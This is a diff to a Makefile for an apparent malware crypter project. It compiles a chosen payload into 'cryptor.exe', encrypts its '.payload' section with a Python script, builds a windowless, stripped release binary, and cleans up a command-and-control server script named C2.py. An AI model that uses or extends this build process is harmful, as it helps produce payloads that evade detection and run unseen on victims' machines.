@@ -19,10 +19,11 @@
 
 Dpath = ./bin/Debug
 Rpath = ./bin/Release
-SrcPath = ./CL_src
+SrcPath = ./CL_SRC
 SvrPath = ./SVR_SRC
-
-Debug: $(SrcPath)/main.c $(SrcPath)/linker.ld | $(Config.h) $(Dpath)
+Payload?= ./
+INC=-I./CL_src
+Debug: $(SrcPath)/main.c $(SrcPath)/linker.ld | $(Dpath)
 
 	@echo [*] Dynamically Generating header files
 
@@ -34,7 +35,12 @@ Debug: $(SrcPath)/main.c $(SrcPath)/linker.ld | $(Config.h) $(Dpath)
 	@echo Keys Generated!
 	@echo Header files Generated.
 	@echo [*] LINKING FILE...
-	gcc -g -T $(SrcPath)/Linker.ld  $(SrcPath)/main.c -o $(Dpath)/cryptor.exe -lCrypt32 -lWs2_32 -lBCrypt
+	# 
+	# We are going to use a sub directory and make both objects
+	gcc -c  $(SrcPath)/main.c  -o $(Dpath)/cryptor.o 
+	gcc -c  ./payload/$(Payload)/*.c  -o $(Dpath)/payload.o $(INC)
+	
+	gcc -g -T $(SrcPath)/linker.ld   $(Dpath)/cryptor.o $(Dpath)/payload.o -o $(Dpath)/cryptor.exe -lCrypt32 -lWs2_32 -lBCrypt
 	@echo COMPLETED: file has been linked into a mn executable format!
 
 
@@ -45,7 +51,7 @@ Debug: $(SrcPath)/main.c $(SrcPath)/linker.ld | $(Config.h) $(Dpath)
 	@echo [*] Encrypting .payload section...
 	py ./MFScripts/cryptPayload.py $(Dpath)
 
-Release: $(SrcPath)/main.c $(SrcPath)/linker.ld | $(Config.h) $(Rpath)
+Release: $(SrcPath)/main.c $(SrcPath)/linker.ld | $(Rpath)
 
 	@echo [*] Dynamically Generating header files
 
@@ -58,8 +64,11 @@ Release: $(SrcPath)/main.c $(SrcPath)/linker.ld | $(Config.h) $(Rpath)
 	@echo Header files Generated.
 
 	@echo [*] LINKING FILE...
-	# -mwindows 
-	gcc -s -static -mwindows -fvisibility=hidden -T $(SrcPath)/Linker.ld  $(SrcPath)/main.c -o $(Rpath)/cryptor.exe -lCrypt32 -lWs2_32 -lBCrypt
+	
+	gcc -c  $(SrcPath)/main.c  -o $(Rpath)/cryptor.o 
+	gcc -c  ./payload/$(Payload)/*.c  -o $(Rpath)/payload.o $(INC)
+	
+	gcc -s -static -mwindows -fvisibility=hidden -T $(SrcPath)/linker.ld  $(Rpath)/cryptor.o $(Rpath)/payload.o -o $(Rpath)/cryptor.exe -lCrypt32 -lWs2_32 -lBCrypt
 	@echo COMPLETED: file has been linked into a mn executable format!
 	strip -R .comment -R .note $(Rpath)/cryptor.exe
 	strip -s $(Rpath)/cryptor.exe
@@ -75,9 +84,9 @@ Clean:
 	@echo Cleanning all generated files and directories
 	rm -rf ./bin
 	rm -f $(SrcPath)/Cryptor.h
-	rm -f $(SvrPath)/c2.py
+	rm -f $(SvrPath)/C2.py
 	rm -rf $(SvrPath)/__pycache__
-	rm -f ./Conf
+	rm -f ./conf
 	@echo Directorys and files are clean.
 
 .PHONY: Conf
